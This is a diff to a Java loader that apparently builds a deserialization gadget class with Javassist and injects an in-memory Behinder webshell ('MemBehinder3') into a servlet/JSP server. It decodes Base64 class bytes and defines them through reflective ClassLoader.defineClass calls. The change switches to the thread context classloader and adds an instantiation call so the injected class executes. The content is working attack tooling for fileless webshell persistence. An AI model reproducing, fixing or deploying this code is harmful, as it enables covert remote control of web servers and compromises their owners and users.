@@ -19,7 +19,7 @@ public class Loader {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
-        classPool.insertClassPath(new ClassClassPath(PageContext.class));
+        classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
         classPool.insertClassPath(new ClassClassPath(MemBehinder3.class));
 
         CtClass ctClass = classPool.makeClass("BehinderLoader"+ System.nanoTime());
@@ -89,11 +89,12 @@ public class Loader {
         "                                                       byte[] var14 = java.util.Base64.getDecoder().decode(c1);\n" +
                 "                                               java.lang.reflect.Method var15 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
         "                                                       var15.setAccessible(true);\n" +
-                "                                               Class var16 = (Class) var15.invoke(javax.servlet.jsp.PageContext.class.getClassLoader(), new Object[]{var14,new Integer(0), new Integer(var14.length)});\n"+
+                "                                               Class var16 = (Class) var15.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{var14,new Integer(0), new Integer(var14.length)});\n"+
+                "                                               var16.newInstance();\n"+
         "                                                       byte[] var18 = java.util.Base64.getDecoder().decode(c2);\n" +
         "                                                       java.lang.reflect.Method var19 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
         "                                                       var19.setAccessible(true);\n" +
-        "                                                       Class var20 = (Class)var19.invoke(javax.servlet.jsp.PageContext.class.getClassLoader(), new Object[]{var18, new Integer(0), new Integer(var18.length)});\n" +
+        "                                                       Class var20 = (Class)var19.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{var18, new Integer(0), new Integer(var18.length)});\n" +
         "                                                      // var20.newInstance();\n"+
                 "                                               //java.lang.reflect.Field f = var20.getClass().getDeclaredField(\"pageContext\");\n" +
                 "                                               //f.setAccessible(true);\n" +
